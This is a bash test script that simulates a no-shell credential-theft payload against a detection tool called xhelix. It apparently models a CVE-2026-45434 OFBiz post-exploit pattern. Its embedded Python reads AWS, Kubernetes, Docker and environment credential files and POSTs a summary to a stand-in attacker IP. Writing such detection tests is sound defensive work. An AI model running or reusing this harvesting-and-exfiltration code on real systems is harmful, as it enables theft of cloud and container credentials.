#!/bin/bash
# tests/attack-sim/cred-steal-ofbiz-jit-style.sh
#
# AUTHORIZED SECURITY TEST. Run only on hosts the operator owns.
#
# Mimics the OFBiz CVE-2026-45434 Groovy-eval post-exploit pattern:
# a JIT/JVM-equivalent runtime (we use python here as a JIT-style
# stand-in for the Groovy interpreter) reads credentials WITHOUT
# spawning /bin/sh. This is the hard case the LOW_FALSE_POSITIVE
# doc §9 names — "App-server RCE without shell spawn."
#
# Expected catches today:
#   - ptrace_sensitive_target if any debug API is touched
#   - autobaseline novel-from-python_runtime read tag post-seal
# Expected catches AFTER USG full build:
#   - cataloged credential read by python lineage that lacks an
#     issued contract → DENY at kernel hook (USG.2)
#   - tainted-egress to attacker IP regardless of dest (USG.4)
#
# DOES NOT exec /bin/sh — that's the whole point. xhelix should
# still catch this via the broker, not via shell-spawn rules.

set -u
ATTACKER_URL="http://192.0.2.42:8080/jvm-payload"

log() { echo "[ofbiz-sim $(date +%H:%M:%S)] $*"; }
log "=== JVM-style payload (no shell spawn) starting as $(whoami) ==="

python3 - <<'PYEOF'
import os
import sys
import time
import urllib.request

ATTACKER = "http://192.0.2.42:8080/jvm-payload"

paths = [
    f"{os.path.expanduser('~')}/.aws/credentials",
    f"{os.path.expanduser('~')}/.aws/credentials.sealed",
    f"{os.path.expanduser('~')}/.kube/config",
    f"{os.path.expanduser('~')}/.docker/config.json",
    "/proc/self/environ",
    "/etc/environment",
]

collected = []
for p in paths:
    try:
        with open(p, "rb") as f:
            data = f.read(4096)
        collected.append((p, len(data)))
        print(f"[python-payload] READ {p} -> {len(data)} bytes")
    except Exception as e:
        print(f"[python-payload] SKIP {p}: {e}")

# Pure-python outbound — NO shell spawn (this is the OFBiz-Groovy
# fingerprint xhelix's shell-based rules can't catch).
body = "\n".join(f"{p}={n}" for p, n in collected).encode()
req = urllib.request.Request(
    ATTACKER, data=body, method="POST",
    headers={"X-Agent": "ofbiz-groovy-payload"},
)
try:
    with urllib.request.urlopen(req, timeout=2) as resp:
        print(f"[python-payload] exfil status={resp.status}")
except Exception as e:
    print(f"[python-payload] exfil error (expected, TEST-NET): {e}")

print("[python-payload] done.")
PYEOF

log "=== JVM-style payload finished ==="
